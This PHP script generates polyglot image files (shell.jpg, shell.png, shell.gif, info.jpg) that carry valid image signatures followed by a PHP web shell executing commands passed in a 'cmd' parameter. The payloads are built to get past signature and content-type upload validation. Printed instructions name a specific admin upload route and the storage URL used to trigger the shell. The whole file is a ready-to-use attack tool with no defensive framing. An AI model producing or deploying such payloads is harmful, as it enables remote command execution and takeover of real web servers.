<?php
// Tạo các payload bypass signature + content-type validation

echo "🔥 Creating Signature + Content-Type Bypass Payloads...\n";

// JPEG payload with correct signature
$jpegSignature = "\xFF\xD8\xFF\xE0"; // JPEG JFIF
$jpegHeader = $jpegSignature . "\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00";
$fakeImageData = str_repeat("\xFF\x00\x00", 100); // Fake image data
$phpPayload = '<?php if(isset($_GET["cmd"])){echo shell_exec($_GET["cmd"]);} ?>';

$jpegContent = $jpegHeader . $fakeImageData . "\n" . $phpPayload;
file_put_contents('shell.jpg', $jpegContent);
echo "✅ Created: shell.jpg (JPEG + PHP shell)\n";

// PNG payload with correct signature  
$pngSignature = "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A";
$pngHeader = $pngSignature . "\x00\x00\x00\x0DIHDR\x00\x00\x00\x64\x00\x00\x00\x64\x08\x02\x00\x00\x00";
$pngContent = $pngHeader . $fakeImageData . "\n" . $phpPayload;
file_put_contents('shell.png', $pngContent);
echo "✅ Created: shell.png (PNG + PHP shell)\n";

// GIF payload with correct signature
$gifSignature = "GIF89a";
$gifHeader = $gifSignature . "\x64\x00\x64\x00\xF0\x00\x00";
$gifContent = $gifHeader . $fakeImageData . "\n" . $phpPayload; 
file_put_contents('shell.gif', $gifContent);
echo "✅ Created: shell.gif (GIF + PHP shell)\n";

// Info payload
$infoPayload = '<?php echo "PHP: ".phpversion()."\nOS: ".php_uname()."\nUser: ".get_current_user(); ?>';
$jpegInfoContent = $jpegHeader . $fakeImageData . "\n" . $infoPayload;
file_put_contents('info.jpg', $jpegInfoContent);
echo "✅ Created: info.jpg (System info)\n";

echo "\n📋 How to use:\n";
echo "1. Upload shell.jpg via /admin/telephones/edit/1\n";
echo "2. Access uploaded file: /storage/products/[timestamp]_shell.jpg?cmd=whoami\n";
echo "3. Files have correct signatures and will pass validation!\n";

echo "\n🔍 Signatures:\n";
echo "JPEG: " . bin2hex(substr($jpegContent, 0, 4)) . "\n";
echo "PNG:  " . bin2hex(substr($pngContent, 0, 8)) . "\n"; 
echo "GIF:  " . bin2hex(substr($gifContent, 0, 6)) . "\n";
?> 